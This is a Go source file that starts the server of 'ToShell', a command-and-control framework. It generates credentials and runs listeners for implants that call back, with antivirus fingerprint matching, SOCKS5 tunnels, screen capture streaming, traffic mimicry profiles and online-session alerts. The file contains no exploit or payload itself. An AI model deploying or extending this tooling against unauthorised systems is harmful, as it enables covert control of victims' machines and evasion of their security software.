package main

import (
	"context"
	"crypto/rand"
	"encoding/base64"
	"flag"
	"fmt"
	"io/fs"
	"log"
	"net/http"
	"os"
	"os/signal"
	"path/filepath"
	"strings"
	"syscall"
	"time"

	"github.com/spf13/viper"
	"toshell/internal/common/types"
	"toshell/internal/server/api"
	"toshell/internal/server/auth"
	"toshell/internal/server/avdetect"
	"toshell/internal/server/config"
	"toshell/internal/server/database"
	"toshell/internal/server/listener"
	"toshell/internal/server/logging"
	"toshell/internal/server/plugin"
	"toshell/internal/server/session"
	"toshell/internal/server/task"
	"toshell/internal/server/webhook"
)

var (
	version   = "1.2.0"
	commit    = "dev"
	buildTime = "unknown"
)

// stripRootFS 适配 embed.FS 与 http.FileServer 的路径规范差异。
// http.FileServer 传入以 "/" 开头的路径，而 http.FS(embed.FS) 的 fs.ValidPath
// 校验只接受相对路径（http.FS 仅对 "/" 特判为 "."），故去除前导 "/"；
// 空路径（"/" 去除前缀后）转 "." 以复用 http.FS 的根目录处理。
type stripRootFS struct {
	fsys http.FileSystem
}

func (s *stripRootFS) Open(name string) (http.File, error) {
	name = strings.TrimPrefix(name, "/")
	if name == "" {
		name = "."
	}
	return s.fsys.Open(name)
}

type Server struct {
	config       *config.Config
	db           *database.Database
	sessionMgr   *session.Manager
	taskMgr      *task.Manager
	tcpListener  *listener.TCPListener
	httpListener *listener.HTTPListener
	apiServer    *api.Server
	logger       *logging.Logger
}

func main() {
	cfgPath := flag.String("config", "", "path to config file")
	showVersion := flag.Bool("version", false, "show version information")
	flag.Parse()

	if *showVersion {
		fmt.Printf("ToShell Team Server %s\n", version)
		fmt.Printf("Commit: %s\n", commit)
		fmt.Printf("Build Time: %s\n", buildTime)
		os.Exit(0)
	}

	srv, err := NewServer(*cfgPath)
	if err != nil {
		fmt.Fprintf(os.Stderr, "Failed to initialize server: %v\n", err)
		os.Exit(1)
	}

	if err := srv.Start(); err != nil {
		fmt.Fprintf(os.Stderr, "Server error: %v\n", err)
		os.Exit(1)
	}
}

func NewServer(cfgPath string) (*Server, error) {
	cfg, err := config.Load(cfgPath)
	if err != nil {
		return nil, fmt.Errorf("failed to load config: %w", err)
	}

	// Auto-generate security credentials on first start
	var configChanged bool

	if cfg.Auth.AdminPassword == "" {
		plainPassword, err := generateRandomPassword(16)
		if err != nil {
			return nil, fmt.Errorf("failed to generate admin password: %w", err)
		}
		hashedPassword, err := auth.HashPassword(plainPassword)
		if err != nil {
			return nil, fmt.Errorf("failed to hash admin password: %w", err)
		}
		cfg.Auth.AdminPassword = hashedPassword
		viper.Set("auth.admin_password", hashedPassword)
		log.Printf("[SECURITY] First start - generated admin password: %s", plainPassword)
		log.Printf("[SECURITY] Store this password securely! It will not be shown again.")
		configChanged = true
	}

	if cfg.Auth.JWTKey == "" {
		jwtKey, err := auth.GenerateRandomKey(32)
		if err != nil {
			return nil, fmt.Errorf("failed to generate JWT key: %w", err)
		}
		cfg.Auth.JWTKey = jwtKey
		viper.Set("auth.jwt_key", jwtKey)
		keyPreview := jwtKey
		if len(keyPreview) > 16 {
			keyPreview = keyPreview[:16]
		}
		log.Printf("[SECURITY] First start - generated JWT key (first 16 chars): %s...", keyPreview)
		configChanged = true
	}

	// 监听加密密钥为空时自动生成 AES-256 密钥，保证首次启动即可用。
	// 注意：AES 密钥以 []byte(EncryptionKey) 的原始字节长度为准，须为 16/24/32 字节，
	// 因此用 24 字节随机数做 base64 编码，得到恰好 32 个可打印字符。
	if cfg.Listener.EncryptionKey == "" {
		raw := make([]byte, 24)
		if _, err := rand.Read(raw); err != nil {
			return nil, fmt.Errorf("failed to generate listener encryption key: %w", err)
		}
		encKey := base64.StdEncoding.EncodeToString(raw) // 24 bytes -> 32 chars
		cfg.Listener.EncryptionKey = encKey
		viper.Set("listener.encryption_key", encKey)
		log.Printf("[SECURITY] First start - generated listener encryption key (AES-256)")
		configChanged = true
	}

	if configChanged {
		if err := viper.WriteConfig(); err != nil {
			log.Printf("[WARNING] Failed to write config file: %v", err)
			log.Printf("[WARNING] Credentials are active for this session but will not persist after restart.")
		} else {
			log.Printf("[SECURITY] Config file updated with generated credentials.")
		}
	}

	logger, err := logging.New(cfg.Logging.Output, cfg.Logging.Level, cfg.Logging.Format)
	if err != nil {
		return nil, fmt.Errorf("failed to initialize logger: %w", err)
	}
	logging.Info("server", "ToShell Team Server v%s starting...", version)

	db, err := database.New(cfg.Database.Type, cfg.Database.Path)
	if err != nil {
		logger.Warn("server", "Failed to initialize database: %v, running without persistence", err)
	} else {
		logging.Info("server", "Database initialized: %s", cfg.Database.Path)
		registerDefaultListener(cfg, db)
	}

	sessMgr := session.New()
	taskMgr := task.New(sessMgr)

	// 加载服务端安全软件指纹库（data/av_fingerprints.json），供 av_detect 任务结果匹配
	if err := avdetect.Load(); err != nil {
		logging.Warn("server", "Failed to load AV fingerprint library: %v", err)
	} else {
		logging.Info("server", "AV fingerprint library loaded: %s (%d entries)", avdetect.Path(), avdetect.ProcessCount())
	}

	_, err = plugin.Init("plugins")
	if err != nil {
		logging.Warn("server", "Failed to initialize plugin manager: %v", err)
	} else {
		logging.Info("server", "Plugin manager initialized, directory: plugins")
	}

	// 设置默认监听器 ID（与 registerDefaultListener 的 DB 记录一致），
	// 使默认监听器注册的会话带 ListenerID，Web 界面停止/删除默认监听器时
	// 也能通过路由表真实关闭 socket。
	cfg.Listener.ID = fmt.Sprintf("default-%s-%d", cfg.Listener.Host, cfg.Listener.Port)

	tcpListener, err := listener.NewTCPListener(&cfg.Listener, sessMgr, taskMgr)
	if err != nil {
		logging.Error("server", "Failed to create TCP listener: %v", err)
	}

	httpListener, err := listener.NewHTTPListener(&cfg.Listener, sessMgr, taskMgr)
	if err != nil {
		logging.Warn("server", "Failed to create HTTP listener: %v", err)
	}

	apiServer := api.New(cfg, sessMgr, taskMgr)

	// 注入嵌入式前端文件系统（单二进制部署时嵌入 web/dist）。
	// embed.FS 与 http.FileServer 存在路径规范化冲突：FileServer 传入以 "/" 开头的路径，
	// 而 http.FS(embed.FS) 内部会做 fs.ValidPath 校验（要求不以 "/" 开头），
	// 直接使用会导致所有静态资源 404，故用 stripRootFS 适配。
	if subFS, err := fs.Sub(webDistFS, "webdist"); err == nil {
		apiServer.SetWebFS(&stripRootFS{fsys: http.FS(subFS)})
	}

	// Wire up task result callback to broadcast via WebSocket to frontend
	taskResultCallback := func(eventType string, taskID uint64, sessionID string, taskType string, exitCode int32, output string, errorMsg string) {
		// Truncate output for summary
		outputSummary := output
		if len(outputSummary) > 200 {
			outputSummary = outputSummary[:200] + "..."
		}
		apiServer.BroadcastTaskEvent(eventType, taskID, sessionID, taskType, exitCode, outputSummary, errorMsg)
	}

	// 会话上线 webhook 通知（仅上线通知，配置见 configs/server.yaml 的 webhook 段）
	webhookNotifier := webhook.New(&cfg.Webhook)

	if tcpListener != nil {
		tcpListener.SetOnTaskResult(taskResultCallback)
		// C2 闪断/超时很常见，植入体通常会自动重连。
		// 此处不再永久 StopSOCKS5：保留本地 1090 等代理端口，避免浏览器突然失效。
		// 仅在用户主动 DELETE /api/v1/tunnels/{id} 时停止代理。
		tcpListener.SetOnSessionDead(func(sessionID string) {
			fmt.Printf("[INFO] [server] Session %s disconnected (SOCKS5 kept alive for reconnect)\n", sessionID)
		})
		tcpListener.SetOnSessionOnline(webhookNotifier.NotifyOnline)
		tcpListener.SetOnScreenFrame(apiServer.BroadcastScreenFrame)
	}
	if httpListener != nil {
		httpListener.SetOnTaskResult(taskResultCallback)
		httpListener.SetOnSessionDead(func(sessionID string) {
			fmt.Printf("[INFO] [server] Session %s disconnected (SOCKS5 kept alive for reconnect)\n", sessionID)
		})
		httpListener.SetOnSessionOnline(webhookNotifier.NotifyOnline)
	}

	// 优先使用 TCP listener, 回退到 HTTP listener
	if tcpListener != nil {
		apiServer.SetListener(tcpListener)
	} else if httpListener != nil {
		apiServer.SetListener(httpListener)
	}

	// 配置热更新：设置 API 保存或配置文件被外部修改后，
	// 同步应用无需重启即可生效的组件（HTTP listener 拟态模板、AI 副驾驶等）。
	applyHotConfig := func(cfg *config.Config) {
		if cfg == nil {
			return
		}
		if httpListener != nil {
			httpListener.UpdateMimicry(cfg.Listener.MimicryProfile)
		}
		// AI 副驾驶配置热生效（base_url/api_key/model 修改无需重启）
		apiServer.ReconfigureCopilot(cfg.AI)
		logging.Info("server", "配置已热更新并应用 (mimicry=%s)", cfg.Listener.MimicryProfile)
	}
	apiServer.SetOnConfigApplied(applyHotConfig)
	config.OnChange(func(cfg *config.Config) {
		if cfg == nil {
			return
		}
		if httpListener != nil {
			httpListener.UpdateMimicry(cfg.Listener.MimicryProfile)
		}
		apiServer.ReconfigureCopilot(cfg.AI)
		logging.Info("server", "检测到配置文件变化，已自动热重载 (mimicry=%s)", cfg.Listener.MimicryProfile)
	})

	return &Server{
		config:       cfg,
		db:           db,
		sessionMgr:   sessMgr,
		taskMgr:      taskMgr,
		tcpListener:  tcpListener,
		httpListener: httpListener,
		apiServer:    apiServer,
		logger:       logger,
	}, nil
}

func (s *Server) Start() error {
	logging.Info("server", "Starting API server on %s:%d", s.config.Server.APIHost, s.config.Server.APIPort)

	go func() {
		addr := fmt.Sprintf("%s:%d", s.config.Server.APIHost, s.config.Server.APIPort)
		if err := s.apiServer.Start(addr); err != nil {
			logging.Error("server", "API server error: %v", err)
		}
	}()

	// TCP 与 HTTP 监听器共用 cfg.Listener 的同一端口（8080），二者互斥：
	// TCP 启动成功则跳过 HTTP（HTTP 仅作回退），避免 bind 冲突。
	// 启动成功后注册进 API 路由表：Web 界面停止/删除默认监听器时能真实关闭。
	if s.tcpListener != nil {
		if err := s.tcpListener.Start(); err != nil {
			logging.Error("server", "Failed to start TCP listener: %v", err)
			if s.httpListener != nil {
				if err := s.httpListener.Start(); err != nil {
					logging.Error("server", "Failed to start HTTP listener: %v", err)
				} else {
					s.apiServer.RegisterRuntimeListener(s.config.Listener.ID, s.httpListener, s.httpListener.Stop)
				}
			}
		} else {
			s.apiServer.RegisterRuntimeListener(s.config.Listener.ID, s.tcpListener, s.tcpListener.Stop)
		}
	} else if s.httpListener != nil {
		if err := s.httpListener.Start(); err != nil {
			logging.Error("server", "Failed to start HTTP listener: %v", err)
		} else {
			s.apiServer.RegisterRuntimeListener(s.config.Listener.ID, s.httpListener, s.httpListener.Stop)
		}
	}

	// 自动恢复 Web 界面创建且标记为 running 的监听器：
	// 这些监听器（非 default-*）重启后 socket 不会自动重建，植入端无法回连。
	// 在默认监听器启动之后异步执行，避免阻塞 API 就绪。
	go func() {
		time.Sleep(2 * time.Second)
		restored := s.apiServer.RestoreRunningListeners()
		if restored > 0 {
			logging.Info("server", "Auto-restored %d listener(s) from database", restored)
		}
	}()

	// cleanupStaleFiles 递归删除指定目录下修改时间超过 maxAge 的普通文件。
	cleanupStaleFiles := func(root string, maxAge time.Duration) {
		_ = filepath.WalkDir(root, func(path string, d fs.DirEntry, err error) error {
			if err != nil {
				return nil
			}
			if d.IsDir() {
				return nil
			}
			info, ierr := d.Info()
			if ierr != nil {
				return nil
			}
			if time.Since(info.ModTime()) > maxAge {
				if rmErr := os.Remove(path); rmErr == nil {
					logging.Info("server", "Cleaned stale temp file: %s", path)
				}
			}
			return nil
		})
	}

	go func() {
		ticker := time.NewTicker(1 * time.Minute)
		defer ticker.Stop()
		for range ticker.C {
			if s.taskMgr != nil {
				s.taskMgr.CleanupOldTasks(24 * time.Hour)
			}
			// 登录限速表定期清理（过期条目删除，防内存无界增长）
			api.CleanupLoginLimiter()
			// 定期清理上传/下载暂存文件（超过 24h 视为残留），避免服务端磁盘膨胀
			cleanupStaleFiles("data/uploads", 24*time.Hour)
			cleanupStaleFiles("data/transfers", 24*time.Hour)
		}
	}()

	sigChan := make(chan os.Signal, 1)
	signal.Notify(sigChan, syscall.SIGINT, syscall.SIGTERM)

	sig := <-sigChan
	logging.Info("server", "Received signal %v, shutting down...", sig)

	return s.Shutdown()
}

func (s *Server) Shutdown() error {
	_, cancel := context.WithTimeout(context.Background(), 10*time.Second)
	defer cancel()

	if s.tcpListener != nil {
		logging.Info("server", "Shutting down TCP listener...")
		s.tcpListener.Stop()
	}

	if s.httpListener != nil {
		logging.Info("server", "Shutting down HTTP listener...")
		s.httpListener.Stop()
	}

	logging.Info("server", "Shutting down API server...")
	if err := s.apiServer.Stop(); err != nil {
		logging.Error("server", "Error stopping API server: %v", err)
	}

	if s.db != nil {
		logging.Info("server", "Closing database...")
		s.db.Close()
	}

	logging.Info("server", "Server shutdown complete")
	return nil
}

// registerDefaultListener registers the listener defined in the config file into the
// database so that it shows up in the listeners page. It uses a stable ID derived from
// the bind address to avoid duplicates across restarts, and only registers when the
// listener is enabled.
func registerDefaultListener(cfg *config.Config, db *database.Database) {
	if db == nil || !cfg.Listener.Enabled {
		return
	}

	id := fmt.Sprintf("default-%s-%d", cfg.Listener.Host, cfg.Listener.Port)

	existing, err := db.ListListeners()
	if err != nil {
		logging.Warn("server", "Failed to list listeners for default registration: %v", err)
		return
	}
	for _, l := range existing {
		if l.ID == id {
			// Already registered; keep its runtime status in sync.
			if l.Status != "running" {
				_ = db.UpdateListenerStatus(id, "running")
			}
			return
		}
	}

	protocol := cfg.Listener.Protocol
	if protocol == "" {
		protocol = "websocket"
	}
	listenerType := "http"
	if protocol == "tcp" {
		listenerType = "tcp"
	}

	info := &types.ListenerInfo{
		ID:         id,
		Name:       "Default Listener",
		Type:       listenerType,
		Protocol:   protocol,
		BindAddr:   cfg.Listener.Host,
		BindPort:   cfg.Listener.Port,
		PublicAddr: cfg.Listener.PublicHost,
		Status:     "running",
		CreatedAt:  time.Now(),
	}
	if err := db.CreateListener(info); err != nil {
		logging.Warn("server", "Failed to register default listener: %v", err)
		return
	}
	logging.Info("server", "Default listener registered: %s:%d (%s)", cfg.Listener.Host, cfg.Listener.Port, protocol)
}

// generateRandomPassword generates a random alphanumeric password of the given length.
func generateRandomPassword(length int) (string, error) {
	const charset = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
	b := make([]byte, length)
	if _, err := rand.Read(b); err != nil {
		return "", err
	}
	for i := range b {
		b[i] = charset[int(b[i])%len(charset)]
	}
	return string(b), nil
}
